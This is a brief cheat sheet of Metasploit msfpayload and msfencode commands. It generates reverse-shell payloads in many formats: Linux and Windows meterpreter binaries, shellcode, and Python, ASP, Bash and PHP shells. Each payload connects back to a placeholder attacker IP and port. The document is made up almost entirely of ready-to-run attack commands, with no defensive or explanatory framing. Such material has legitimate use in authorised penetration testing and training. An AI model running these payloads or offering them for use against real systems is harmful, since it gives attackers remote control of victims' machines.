# msf Reverse Shells

Create a Linux Reverse Meterpreter Binary

```
msfpayload linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R | msfencode -t elf -o shell
```

Create Reverse Shell (Shellcode)

```
msfpayload windows/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R | msfencode -b ā\x00\x0a\x0dā
```

Create a Reverse Shell Python Script

```
msfpayload cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R > shell.py
```

Create a Reverse ASP Shell

```
msfpayload windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R | msfencode -t asp -o shell.asp
```

Create a Reverse Bash Shell

```
msfpayload cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R > shell.sh
```

Create a Reverse PHP Shell

```
msfpayload php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R > shell.php
```

Edit shell.php in a text editor to add <?php at the beginning.
Create a Windows Reverse Meterpreter Binary

```
msfpayload windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> X >shell.exe

```




